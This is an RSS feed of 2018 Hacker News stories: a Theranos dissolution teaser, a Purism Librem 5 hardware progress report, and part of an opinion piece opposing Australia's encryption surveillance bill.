<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Blood-Testing Firm Theranos to Dissolve</title>
<link>https://www.wsj.com/articles/blood-testing-firm-theranos-to-dissolve-1536115130</link>
<guid isPermaLink="true" >https://www.wsj.com/articles/blood-testing-firm-theranos-to-dissolve-1536115130</guid>
<description>&lt;p&gt;Theranos Inc., the blood-testing company accused of perpetrating Silicon Valley’s biggest fraud, will soon cease to exist.&lt;/p&gt; &lt;p&gt;In the wake of a high-profile scandal, the company will formally dissolve, according to an email to shareholders. Theranos will seek to pay unsecured creditors its remaining cash in coming months, the email said.&lt;/p&gt; &lt;p&gt;The move...
  &lt;/p&gt;</description>
<pubDate>Wed, 05 Sep 2018 02:59:40 +0000</pubDate>
<dc:creator>mudil</dc:creator>
<og:title>Blood-Testing Firm Theranos to Dissolve </og:title>
<og:description>Theranos, the blood-testing company accused of perpetrating Silicon Valley’s biggest fraud, will formally dissolve. The move comes after prosecutors filed criminal charges against founder Elizabeth Holmes.</og:description>
<og:url>https://www.wsj.com/articles/blood-testing-firm-theranos-to-dissolve-1536115130</og:url>
<og:image>https://si.wsj.net/public/resources/images/B3-BP454_0905TH_SOC_20180904225026.jpg</og:image>
<og:type>article</og:type>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.wsj.com/articles/blood-testing-firm-theranos-to-dissolve-1536115130</dc:identifier>
</item>
<item>
<title>Progress update from the Librem 5 hardware department</title>
<link>https://puri.sm/posts/librem5-2018-09-hardware-report/</link>
<guid isPermaLink="true" >https://puri.sm/posts/librem5-2018-09-hardware-report/</guid>
<description>&lt;p&gt;As you might have noted when we announced closing the development kit “last call” sale, new specifications have been made public. I want to explain what led to these specifications and why we made the choices we made and what the current timeline is for the devkits and Librem 5 phones.&lt;span id=&quot;more-53202&quot;/&gt;&lt;/p&gt;
&lt;p&gt;We want to make a secure mobile communication device which can offer on-par experience similar to today’s smartphones, while making it as free and transparent to the extent we can given the reality of today. We take the notion of “free” or “libre” seriously, striving to comply with the Free Software Foundation (&lt;a href=&quot;https://www.fsf.org/&quot;&gt;FSF&lt;/a&gt;) strict “Respects Your Freedom” (&lt;a href=&quot;https://www.fsf.org/resources/hw/endorsement/criteria&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;RYF&lt;/a&gt;) requirements. Having that endorsement is an important and critical goal for us. The RYF criteria rules out a substantial amount of hardware, making finding RYF complaint phone hardware a challenging endeavor. It would have been relatively trivial to produce a smartphone with non-free GPU drivers and a CPU with combined radios + CPU + GPU in a few months, but creating a regular smartphone is not our goal. We have much higher aspirations.&lt;/p&gt;
&lt;p&gt;We chose to build a free and secure mobile communication device. One that respects peoples’ privacy and security. We chose to do it because the pursuit of building one will challenge us as a company and to provide a product to those who care deeply about software and hardware freedom. It is an endeavor that we are unwilling to compromise on with the firm belief that it is achievable.&lt;/p&gt;
&lt;p&gt;Let’s talk about what the current state of things are.&lt;/p&gt;
&lt;h2&gt;The Road from an i.MX 6 to i.MX 8M platform&lt;/h2&gt;
&lt;p&gt;You may remember our previous post hinting at &lt;a href=&quot;https://puri.sm/posts/librem5-roadmap-to-imx8/&quot;&gt;the reasoning for us to move from the i.MX 6 platform to the i.MX 8M platform&lt;/a&gt;. Today, we’ll be providing significant more details and an update on how this transition has been going since then.&lt;/p&gt;
&lt;p&gt;Phone hardware is comprised of a SoC (System on a Chip) and peripheral hardware like modems that connect them to cellular networks. In early 2017, when we started our research for the right SoC, we quickly came to the conclusion that the NXP i.MX family—with the free Etnaviv drivers for the embedded Vivante GPU—would be the best choice. The fact that the NXP i.MX 6 did not require a proprietary firmware for normal phone use cases, combined with an advanced free “etnaviv” GPU driver available, was very attractive to us. The fact that the SoC has been on the market for quite some time also meant that the drivers were stable and solid.&lt;/p&gt;
&lt;p&gt;By late summer 2017, we became aware that the newer “i.MX 8” generation of SoC was rumored to be released soon. At the time, we had already launched our crowdfunding campaign and there was no publicly available information on this newer generation SoC, so we had to continue with the plans already in place. The allure of having a newer generation SoC was enough that we reached out to NXP and various distributors to get more detailed information on these new SoCs. While continuing to work on other parts of the phone and working on our software, we kept communication lines open on the new SoC opportunity after nearly six months, then we were able to obtain early documentation but no availability dates.&lt;/p&gt;
&lt;p&gt;In early 2018, we got word that the i.MX 8 family would finally be announced at “Embedded World” in Nürnberg, Germany! So after a small hackfest in Germany, Purism CEO Todd Weaver and I drove to Nürnberg and met with NXP and i.MX 8 partners. We were able to get a demonstration of actual i.MX8 hardware and associated firmware to see it running. Even the latest Etnaviv was already working well. We were excited about the opportunities of running a more recent hardware.&lt;/p&gt;
&lt;p&gt;We were confident that the i.MX 8 was well suited for the Librem 5 and will be available in larger quantities early enough for our currently scheduled shipping date of January 2019. The decision to upgrade to a newer generation of the SoC (from the the same hardware family) brings the benefits of a modern 64-bit CPU, more GPUs on the silicon, lower power consumption and a host of other upgrades, while still allowing us to maintain our strict requirements to seek the FSF’s “RYF” endorsement. We believe that the risk trade-off is worth it given the modern upgrades the new SoC provides us. The SoC is of course not the only concern for the Librem 5.&lt;/p&gt;
&lt;h2&gt;Challenges of Making a Non-Android Mobile Phone&lt;/h2&gt;
&lt;p&gt;Making a non-Android mobile phone that will run an FSF-approved OS that supports all the features that we’ve all come to rely on (cellular, WiFi, Bluetooth, touchscreen input) has and continues to involve a lot of pathfinding, given that a RYF phone has never been attempted before and discovery involves solving issues as they come up.&lt;/p&gt;
&lt;p&gt;The industry offers all the hardware to create a smartphone on a fast path, as the SoC vendors typically provide the modem (cellular and wifi) integrated directly on the SoC. Like a recipe in a cookbook—take an SoC, place it on a PCB, add RAM and flash chip on top of it (called a package on package—PoP), add antennas and finally power. The difficulty comes down to the firmware and the software that run these devices. The necessary firmware to operate the cellular modem, WiFi, BT etc. is provided by the chip maker, including the drivers for the GPU and more. The firmware and software included is proprietary with no source code with little to no alternatives.&lt;/p&gt;
&lt;h2&gt;Cellular (baseband) modem&lt;/h2&gt;
&lt;p&gt;The cellular modem is arguably the most complex part of a mobile phone. The modem is the component that has to implement all the familiar protocols you would associate with a phone (like 2G, 3G, 4G and the upcoming 5G). It does so by running its own proprietary black box operating system. The cellular modem is also covered by thousands of patents held by hundreds of patent owners. Now imagine this… This cellular modem sits right on the same RAM bus as the SoC! Non-free software not only has access to the data flowing to and from the SoC, but also has the ability to modify it. Because this modem operating system is a propreitary black box, we have no idea what this component does or what kind of vulnerabilities it has.&lt;/p&gt;
&lt;p&gt;Coming back to the design of the Librem 5 phone, we clearly do not believe this is an ideal situation. The cellular modem should be isolated from the SoC by not accessing the RAM bus. The situation is further complicated by the fact that during our research into cellular modems, we realized that there are only a handful of silicon vendors in the world that make these chipsets and nearly all of them integrate their model with the SoC on the same bus. In addition, you historically need to acquire a license to run the proprietary firmware to power the modem on SoCs.&lt;/p&gt;
&lt;p&gt;This left us with only one choice: to use ready-made modem “modules” and our own layout that isolates the modem from the SoC. There are a number of these modem modules available in different form factors with various available options in speed, bands, etc. By going the module route we can both provide supplier choice in modems that meet our strict standards, and also allow modem isolation from the RAM and host CPU.&lt;/p&gt;
&lt;p&gt;To isolate the cellular modem from the SoC, we will be placing the modem on the (remarkably fast) USB bus and have the phone interact with the cellular modem through USB instead of on the main RAM bus. This will separate the cellular modem on its own bus without seeing any other data.&lt;/p&gt;
&lt;h2&gt;WiFi/Bluetooth modem&lt;/h2&gt;
&lt;p&gt;For WiFi and Bluetooth radios we are currently working closely with Redpine Signal. Redpine Signal will supply us with a low power WiFi/Bluetooth solution using SDIO as the data interface. We went with Redpine Signal as their chipset does not require a firmware download at runtime like other vendors; having a downloadable firmware would violate the Free Software Foundation’s RYF requirements. In the end, we believe we have a great solution for WiFi and Bluetooth that will integrate well and at low power in the Librem phone. This is highlighting the fact that Purism, as a social purpose corporation, will push our strict agenda of software and user freedoms upstream into the supply chain.&lt;/p&gt;
&lt;h2&gt;EE, ID, and MD &lt;small&gt;(Electronics Engineering, Industrial Design, and Mechanical Design)&lt;/small&gt;&lt;/h2&gt;
&lt;p&gt;To find the right vendors to build our hardware components, a while ago Todd and I went to Shenzhen, China. Shenzhen is where two-thirds of the current worldwide production of smartphones happens, where over a billion devices per year are produced. That’s where the optimized supply chain logistics have been developed over the past few decades, and that’s where the physical electronics engineering expertise is these days. We selected this area because this is where we are going to find the expertise in building the Librem 5 with the hardware components we have selected.&lt;/p&gt;
&lt;p&gt;Selecting fabrication partners for our custom design has been an exciting exercise due to all the possibilities that could be reality. Since the beginning of April of this year, we have been evaluating hardware fabrication companies and factories that would be willing to work with us. Aligned with our original planning and timeline we began working with an electronics design house and soon after we located our mechanical design and hardware fabrication.&lt;/p&gt;
&lt;h2&gt;Status of the Development Kits&lt;/h2&gt;
&lt;p&gt;We will begin shipping the devkits in October barring any unforeseen issues. We are quite conscious that the hundreds of active developers all are eager to see these development kits and we are eager to send them out and get you developing on the Librem 5 PureOS platform. We have been pushing hard on our supply chain to give us results as quickly as possible. The new devkits will have the newer i.MX 8M based SoC. The current status is that we have completed the design and working towards power up test. We are pleased that the devkits will be assembled and manufactured in the United States, specifically in the San Diego California area, while the final phone production is expected to be in China.&lt;/p&gt;
&lt;p&gt;With the new SoC, devkits will have more up-to-date hardware, faster, more powerful GPUs (from dual core to quad core), 64 bits and overall lower power consumption and heat. This will increase the attractiveness of the phone for those who are doing comparison shopping with other phones.&lt;/p&gt;
&lt;p&gt;The developer documentation for the dev kits are fairly close to being ready and we expect that those who receive the dev kits will be ready to start writing applications relatively quickly.&lt;/p&gt;
&lt;p&gt;The past three to four months have been a period of great activity here at Purism with a lot of pathfinding work, negotiations, and dividing of labors amongst the various parties—A precise dance with many partners working in concert in an effort to get the right product. But like you, we can’t wait for the end result: a truly freedom-driven phone that we hope will disrupt the market today with groundbreaking concepts while still having all the modern features that phones on the market have today.&lt;/p&gt;
&lt;a href=&quot;https://puri.sm/wp-content/uploads/2018/06/2018-07-26-devkit-parts-table.jpg&quot;&gt;&lt;img class=&quot;wp-image-56810 size-large&quot; src=&quot;https://puri.sm/wp-content/uploads/2018/06/2018-07-26-devkit-parts-table-1024x716.jpg&quot; alt=&quot;&quot; width=&quot;960&quot; height=&quot;671&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2018/06/2018-07-26-devkit-parts-table-1024x716.jpg 1024w, https://puri.sm/wp-content/uploads/2018/06/2018-07-26-devkit-parts-table-300x210.jpg 300w, https://puri.sm/wp-content/uploads/2018/06/2018-07-26-devkit-parts-table-768x537.jpg 768w, https://puri.sm/wp-content/uploads/2018/06/2018-07-26-devkit-parts-table-600x420.jpg 600w&quot; sizes=&quot;(max-width: 960px) 100vw, 960px&quot;/&gt;&lt;/a&gt;Pictured: parts of the devkit in our office in Germany. When you consider the design of the PCBs we made, the devkits comprise more than 700 components.
&lt;h2&gt;Status of the Librem 5 Phone Roadmap&lt;/h2&gt;
&lt;p&gt;Let’s move on to the schedule for the Librem 5. With the latest information at our disposal, we foresee a delay in production until April 2019. The reason is that there is a silicon bug on the SoC that causes extreme battery draining. If we were to put out the phone with this bug, the phone battery would drain out within an hour or so… That’s not the first impression we want to give!&lt;/p&gt;
&lt;p&gt;The errata from NXP (the silicon vendor) for the currently shipping revision can be found &lt;a href=&quot;https://www.nxp.com/products/processors-and-microcontrollers/arm-based-processors-and-mcus/i.mx-applications-processors/i.mx-8-processors/i.mx-8m-family-armcortex-a53-cortex-m4-audio-voice-video:i.MX8M?tab=Documentation_Tab&quot;&gt;here&lt;/a&gt;. More specifically, this &lt;a href=&quot;https://www.nxp.com/docs/en/errata/IMX8MDQLQ_0N14W.pdf&quot;&gt;document &lt;/a&gt;where the two issues that can affect power management and power consumption are identified as “e11174” and “e11171”.&lt;/p&gt;
&lt;p&gt;We are working closely with the silicon vendor, NXP, to fix the issue.&lt;br/&gt;Why April?  We want to be realistic with our projection based on a number of factors:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;If the problem gets fixed by December, that runs into the holiday season in Europe and America.&lt;/li&gt;
&lt;li&gt;February is the Chinese New Year and effectively the entire country is shut down for that month. Therefore, we can only restart the production ramp-up process in March, with first units to be produced in April.&lt;/li&gt;
&lt;li&gt;Internally, we have a lot of plans that need a hard date to plan off of, and so it is imperative that we hit close to our dates in order to meet commitments with the press, community (online and at various events), investors, and others.&lt;/li&gt;
&lt;li&gt;We want to give all of you a date that is realistic so that we can provide the best first experience as possible. We want you to be wow’d but we need a long tail to properly QA the product after the initial power on. So this is why we are saying that we are hoping to begin production in April (if we can manage earlier, that’s great, but we’d rather not over-promise).&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;You might wonder why the schedule for the devkits did not change significantly compared to the Librem 5 phone (that we release to the public). The devkits are meant to be plugged in and thus are not negatively affected by the silicon bug as the devkits are meant to be used while connected to a power outlet. The devkits will therefore be shipped with the SoC that has the silicon power bug, as this will not affect developers (since it is not like you would expect to carry a devkit in your pocket with days of standby time).&lt;/p&gt;
&lt;p&gt;To whet your appetite, we have included below one of the early blueprints of the development kit (don’t use it as a reference!)—as well as some recent 3D renderings of it, for your viewing pleasure.&lt;/p&gt;
&lt;a href=&quot;https://puri.sm/wp-content/uploads/2018/06/2018-07-26-dev-kit-blueprint.jpg&quot;&gt;&lt;img class=&quot;wp-image-56811 size-large&quot; src=&quot;https://puri.sm/wp-content/uploads/2018/06/2018-07-26-dev-kit-blueprint-1024x724.jpg&quot; alt=&quot;&quot; width=&quot;960&quot; height=&quot;679&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2018/06/2018-07-26-dev-kit-blueprint-1024x724.jpg 1024w, https://puri.sm/wp-content/uploads/2018/06/2018-07-26-dev-kit-blueprint-300x212.jpg 300w, https://puri.sm/wp-content/uploads/2018/06/2018-07-26-dev-kit-blueprint-768x543.jpg 768w, https://puri.sm/wp-content/uploads/2018/06/2018-07-26-dev-kit-blueprint-600x424.jpg 600w, https://puri.sm/wp-content/uploads/2018/06/2018-07-26-dev-kit-blueprint.jpg 1528w&quot; sizes=&quot;(max-width: 960px) 100vw, 960px&quot;/&gt;&lt;/a&gt;An early blueprint of the development kit &lt;img class=&quot;wp-image-58305 size-full&quot; src=&quot;https://puri.sm/wp-content/uploads/2018/09/Librem520devkit203D20front20and20back20combined.png&quot; alt=&quot;&quot; width=&quot;1032&quot; height=&quot;891&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2018/09/Librem520devkit203D20front20and20back20combined.png 1032w, https://puri.sm/wp-content/uploads/2018/09/Librem520devkit203D20front20and20back20combined-300x259.png 300w, https://puri.sm/wp-content/uploads/2018/09/Librem520devkit203D20front20and20back20combined-768x663.png 768w, https://puri.sm/wp-content/uploads/2018/09/Librem520devkit203D20front20and20back20combined-1024x884.png 1024w, https://puri.sm/wp-content/uploads/2018/09/Librem520devkit203D20front20and20back20combined-600x518.png 600w&quot; sizes=&quot;(max-width: 1032px) 100vw, 1032px&quot;/&gt;3D rendering of Librem 5 Devkit front and back
&lt;p&gt;Beyond devkits, one of the things that I think all of you would be pleased with is that the phone will have a user-replaceable battery: unlike the vast majority of mobile phones we see on the market today, ours won’t have the battery soldered onto the mainboard and the case will not be glued beyond reapairability.&lt;/p&gt;
&lt;p&gt;The phone design schematics are pretty much complete and we’ve been busy focusing on putting the device together. There are some missing pieces like the modem that needs to be incorporated, but other than that there currently are no show-stopping issues in regards to manufacturing the phone.&lt;/p&gt;
&lt;p&gt;We’ve also been playing around with &lt;a href=&quot;https://puri.sm/posts/librem5-progress-report-18/&quot;&gt;putting as little branding as possible on the phone&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;The Journey Continues&lt;/h2&gt;
&lt;p&gt;Amazing amounts of diligent work have gone into creating the Librem 5, and we continue to learn new lessons and overcome challenges going forward. One of the hardest things that we had to deal with is establishing the phone hardware supply chain and navigating our way with a whole new set of suppliers around the world, making the right contacts to get what we want accomplished. We can’t underscore enough the challenge that building this supply chain has been. The other challenge is finding compatible hardware components that respects our ideology and FSF RYF endorsement goals when the whole supply chain has traditionally been built for cost effectiveness. Finding suppliers that avoid blobs in the operating system has proven to be, unsurprisingly, long and arduous.&lt;/p&gt;
&lt;p&gt;We will continue to evolve as we understand better how this subset of the industry works. The success of our phone is critical, as it will provide us with the legitimacy and leverage we need to &lt;a href=&quot;https://puri.sm/about/business-model-and-vision/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;bend hardware suppliers to our way of thinking&lt;/a&gt; by showing them that we have the potential to be market leaders with ethical products that respect users.&lt;/p&gt;
&lt;p&gt;For those who invested in us, and continue to be patient with us: you have our undying gratitude. For those who take a wait-and-see approach, we hope that you’ll come around and be part of the Purism family, whether through the phone project or with our other offerings. Thank you.&lt;/p&gt;
&lt;hr class=&quot;ttfmake-hr&quot;/&gt;&lt;p&gt;&lt;em&gt;You might also like: &lt;a href=&quot;https://puri.sm/posts/2018-back-to-school-sale/&quot;&gt;“The Back to School sale is on!”&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 04 Sep 2018 20:57:56 +0000</pubDate>
<dc:creator>fosco</dc:creator>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://puri.sm/posts/librem5-2018-09-hardware-report/</dc:identifier>
</item>
<item>
<title>Australia Wants to Take Government Surveillance to the Next Level</title>
<link>https://www.nytimes.com/2018/09/04/opinion/australia-encryptian-surveillance-bill.html</link>
<guid isPermaLink="true" >https://www.nytimes.com/2018/09/04/opinion/australia-encryptian-surveillance-bill.html</guid>
<description>&lt;div readability=&quot;46.863329583802&quot;&gt;
&lt;div class=&quot;css-1h6whtw&quot; readability=&quot;40.582677165354&quot;&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;SYDNEY, Australia — A state’s capacity to spy on its citizens has grown exponentially in recent years as new technology has meant more aspects of our lives can be observed, recorded and analyzed than ever before. At the same time, much to the frustration of intelligence agencies around the world, so has the ability to keep digital information secret, thanks to encryption.&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;That’s why the main intelligence agencies of the Anglophone world are now hoping that Australia will lead the charge in developing ways to get decrypt information at will, and to tap into data that was previously kept secret. A proposed law, the draft of which was released last month by the cybersecurity minister, is &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;http://www.abc.net.au/news/science/2018-08-20/tech-surveillance-laws-labelled-aggressive-by-critics/10128166&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;an aggressive step&lt;/a&gt; in that direction.&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;We should all be worried, because it’s not just criminals or terrorists who use encryption, but every one of us. We use encryption to buy things online, manage our finances, and communicate personally and professionally. Hospitals, transportation systems and government agencies use encrypted data. Creating tools to weaken encrypted systems for one purpose weakens it for all purposes. If Australia succeeds in doing so, it could be your bank account or your medical records that are compromised in the end.&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;This particular bill has been more than a year in the making. At the June 2017 meeting in Ottawa of the Five Eyes — the intelligence alliance made up of the United States, Britain, Australia, Canada and New Zealand — &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.theaustralian.com.au/national-affairs/national-security/tough-laws-to-put-terror-heat-on-tech-titans/news-story/20b711a9af353ba603ff7edacd95ec32&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;Australia made a point of&lt;/a&gt; the need for states to find ways to overcome encryption. A &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;http://minister.homeaffairs.gov.au/peterdutton/Pages/five-country-ministerial-2017-joint-communique.aspx&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;joint communiqué&lt;/a&gt; that came out of the meeting noted that encryption can “severely undermine public safety efforts” and committed Five Eyes members to working with technology companies to “explore shared solutions.”&lt;/p&gt;
&lt;/div&gt;
&lt;aside class=&quot;css-14jsv4e&quot;/&gt;&lt;/div&gt;&lt;div readability=&quot;48.2625&quot;&gt;
&lt;div class=&quot;css-1h6whtw&quot; readability=&quot;42.9&quot;&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;The Australian government set about translating this objective into law. The release of the bill, which came just before the latest &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.theaustralian.com.au/national-affairs/national-security/five-eyes-data-detectives-to-keep-watch-over-immigration/news-story/1d967afd891399406f5271f3313ba0f1&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;meeting&lt;/a&gt; of the Five Eyes in Australia last month, which confirmed the strategy. No doubt Australia’s intelligence and law enforcement establishment were thrilled with this proposal.&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;Australia, which has no bill of rights, is a logical place to test new strategies for collecting intelligence that can later be adopted elsewhere. Among other things, the proposed law would create a process for “designated communications providers” — defined so expansively that it covers &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.afr.com/news/cyber-security-laws-to-cover-all-businesses-angus-taylor-confirms-20180814-h13zdo&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;any business&lt;/a&gt; hosting a website — to assist intelligence and law enforcement agencies to do almost anything to give them access to encrypted communications. For example, providers may have to build tools, install software or keep agencies up-to-date with developments. In essence, state agencies will be able to circumvent encryption, either with the cooperation of tech companies or by compulsion.&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;The government has been quick to claim that this is not a back door, and the bill prohibits requests to companies to create “systemic” weaknesses. But this prohibition is ambiguous, and the reporting and accountability safeguards are minimal.&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;The truth is that there is simply no way to create tools to undermine encryption without jeopardizing digital security and eroding individual rights and freedoms. Hackers with bad intentions will do their utmost to take advantage of any such tools that companies are forced to provide the government.&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;There are good reasons to be deeply wary of granting powers to state agencies to build and hoard tools that weaken technological infrastructure. Last year, the &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.nytimes.com/2017/05/12/world/europe/uk-national-health-service-cyberattack.html&quot; title=&quot;&quot;&gt;WannaCry ransomware threw&lt;/a&gt; Britain’s National Health Service into chaos. The attack exploited a vulnerability in Microsoft software. According to &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://blogs.microsoft.com/on-the-issues/2017/05/14/need-urgent-collective-action-keep-people-safe-online-lessons-last-weeks-cyberattack/&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;Microsoft&lt;/a&gt;, the United States National Security Agency had discovered the vulnerability well before the ransomware was released, but decided against disclosing it to Microsoft to fix, and thereby protect the information systems used by the health service.&lt;/p&gt;
&lt;/div&gt;
&lt;aside class=&quot;css-14jsv4e&quot;/&gt;&lt;/div&gt;&lt;div readability=&quot;50.7&quot;&gt;
&lt;div class=&quot;css-1h6whtw&quot; readability=&quot;49.761111111111&quot;&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;&lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.nytimes.com/2017/06/28/technology/ransomware-nsa-hacking-tools.html&quot; title=&quot;&quot;&gt;Industry figures and experts&lt;/a&gt; argue that the N.S.A. was seeking to accumulate a kind of digital arsenal — it could use the vulnerability for its own intelligence purposes while it remained unpatched. The problem was that at some point, intelligence about the vulnerability was apparently stolen. Only then did the N.S.A. tell Microsoft about its existence. As Microsoft &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://blogs.microsoft.com/on-the-issues/2017/05/14/need-urgent-collective-action-keep-people-safe-online-lessons-last-weeks-cyberattack/&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;pointed out&lt;/a&gt;, this was the equivalent of a Tomahawk missile going missing. British patients paid the price.&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;Seemingly in response to such criticisms, the bill in Australia prohibits the government from preventing a company from repairing such a vulnerability. But this is cold comfort: The N.S.A. didn’t need to prevent Microsoft patching the problem because Microsoft didn’t even know it existed.&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;The WannaCry attack illustrates how intelligence agencies prioritize their own interests. If we give state agencies more power to build tools to circumvent encryption, not only do we expose ourselves to the risk that they can be stolen, we are forced to trust that these agencies will behave responsibly. The evidence to date suggests the opposite.&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;Worse still, the Australian government hardly has the best reputation for keeping things safe. In recent times, it has lost control of &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.news.com.au/technology/online/security/hackers-are-offering-to-sell-the-medicare-details-of-australians-on-the-dark-web-government-confirms/news-story/c475b1cbc963648c191a1eaceba4b12b&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;medical data&lt;/a&gt;; one of its military contractors was hacked and lost “&lt;a class=&quot;css-1g7m0tk&quot; href=&quot;http://www.abc.net.au/news/2017-10-10/defence-contractors-files-stolen-in-hacking:-security-report/9032290&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;large amounts&lt;/a&gt;” of data; a cabinet full of secret documents even turned up this year in a secondhand &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;http://www.abc.net.au/news/2018-01-31/cabinet-files-reveal-inner-government-decisions/9168442&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;furniture store&lt;/a&gt;. Just think about how easily sophisticated criminals might be able to get their hands on any digital tools for getting access to encrypted communications.&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;When Edward Snowden revealed in 2013 that the American and British spy agencies had tried to weaken encryption so that they could tap digital communications, cryptography scholars voiced &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.theguardian.com/technology/2013/sep/16/nsa-gchq-undermine-internet-security&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;their shock&lt;/a&gt; that these agencies would act “against the interests of the public.” “By weakening all our security so that they can listen in to the communications of our enemies,” they &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;http://bristolcrypto.blogspot.com/2013/09/open-letter-from-uk-security-researchers.html&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;wrote&lt;/a&gt;, “they also weaken our security against our potential enemies.”&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;The same is true today. The Australian government is testing the limits of our democracy by seeking to empower the surveillance state, and what it learns will have implications globally. We need to take a stand against this power grab by state agencies, and reject the idea that encrypted communications undermine security. Quite the opposite: They are complementary.&lt;/p&gt;
&lt;p class=&quot;css-k2zj0n e1kwarht0&quot;&gt;Lizzie O’Shea (&lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://twitter.com/Lizzie_OShea&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;@Lizzie_OShea&lt;/a&gt;) is a human rights lawyer who is writing a book about technology and politics.&lt;/p&gt;
